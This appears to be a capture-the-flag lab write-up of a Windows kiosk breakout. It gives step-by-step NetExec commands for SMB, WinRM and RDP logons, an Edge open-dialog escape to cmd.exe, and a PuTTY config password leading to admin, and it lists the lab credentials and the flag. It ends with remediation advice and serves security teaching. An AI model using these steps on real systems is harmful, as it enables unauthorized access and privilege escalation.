What you need to know

  • WinRM, SMB, and RDP with NetExec after a handed password
  • Kiosk apps that replace the normal shell
  • Browser Open dialogs can start programs
  • PuTTY sessions often store passwords on disk

Main idea

A kiosk is only as safe as each process it can start. Edge Open is a file picker. A file picker can also start cmd.exe.

Story

You start as jmorris with a known password. The host runs a kiosk app named VantaraOpsPortal.exe. Read the portal code or config. Find the svc_vdi password. Log on with RDP as that user. Open Contact Support so Edge starts. Press Ctrl+O. Open C:\Windows\System32\cmd.exe. Read putty.conf. Use the admin password. Take the flag.

Why it works

Three faults sit together. The portal stores a service password. Support starts full Edge. The service profile keeps an admin password in PuTTY config. You do not need a kernel bug. 

jmorris (WinRM)
  → portal password for svc_vdi
  → RDP kiosk → Contact Support → Edge
  → Ctrl+O → cmd.exe
  → Documents\putty.conf → svc_vdi_mgmt
  → WinRM admin → root.txt

Step 1: Scan and prove jmorris

Why: You need open ports and a password that still works.
nmap -Pn -n --top-ports 200 -T4 --open 10.1.194.128
nxc smb 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth
nxc winrm 10.1.194.128 -u jmorris -p 'Fabricat!on2024' --local-auth

Expect: ports 135, 445, 3389 (and WinRM on this build). Host VANTARAOPS. Auth OK.

Step 2: Look for other accounts and portal files

Why: Custom apps often hold secrets and ACLs.
# WinRM as jmorris
whoami /all
dir C:\Users
# search Vantara paths for portal source and scripts

Lab password for the kiosk user: svc_vdi / V@ntara#Ops1.

Also seen: svc_backup / P@ssw0rd! with low rights.

Step 3: RDP as svc_vdi

Why: The kiosk runs as this user. You must break that jail.
nxc rdp 10.1.194.128 -u svc_vdi -p 'V@ntara#Ops1' --local-auth
# or xfreerdp /v:10.1.194.128 /u:svc_vdi /p:'V@ntara#Ops1' /cert:ignore

Expect: full screen VantaraOpsPortal.exe. No normal shell. Hard to close.

Step 4: Click Contact Support so Edge starts

Why: Support calls Process.Start(URL). You must click the control. A plain URL alone is not enough in this lab.

Step 5: Edge open dialog to cmd.exe

Why: The open file dialog is a normal Windows picker. Open a path to a program and that program runs as you.
In Edge:
  Ctrl+O
  File name: C:\Windows\System32\cmd.exe
  Open
  • The kiosk blocked the shell. It did not block Edge children.
  • Any UI that opens free paths can start a shell.

Step 6: Read PuTTY config

Why: Tools often store passwords next to the user profile.
type C:\Users\svc_vdi.VANTARAOPS\Documents\putty.conf
# Password for session → svc_vdi_mgmt : 56tyghbn%^TYGHBN

Step 7: Admin WinRM and flag

Why: Prove admin and take the lab flag.
nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth
nxc winrm 10.1.194.128 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN' --local-auth \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
1ts_N0t_a_BuG_1ts_a_F3atur3

Password chain

jmorris / Fabricat!on2024        WinRM start
svc_backup / P@ssw0rd!           limited SMB
svc_vdi / V@ntara#Ops1           RDP kiosk
svc_vdi_mgmt / 56tyghbn%^TYGHBN  admin

Impact

  • Kiosk breakout to a real shell
  • Local admin from a stored tool password
  • Full host control without a memory bug

Fix

  • Do not put service passwords in the portal binary or next to it.
  • Use AppLocker or WDAC. Allow only the portal. Block Edge or lock the profile.
  • Do not start free URLs from help buttons.
  • Do not store admin passwords in PuTTY on kiosk accounts. Use LAPS.
  • Alert when the kiosk or browser starts cmd or PowerShell.

Extra notes

You can try to replace a service binary on disk. Stop and start of the service still needs admin. The intended path after the shell is password loot, not service abuse.

Edge is a locked UI with an open process tree. Once Edge is allowed, Open is enough. PuTTY then hands you admin.
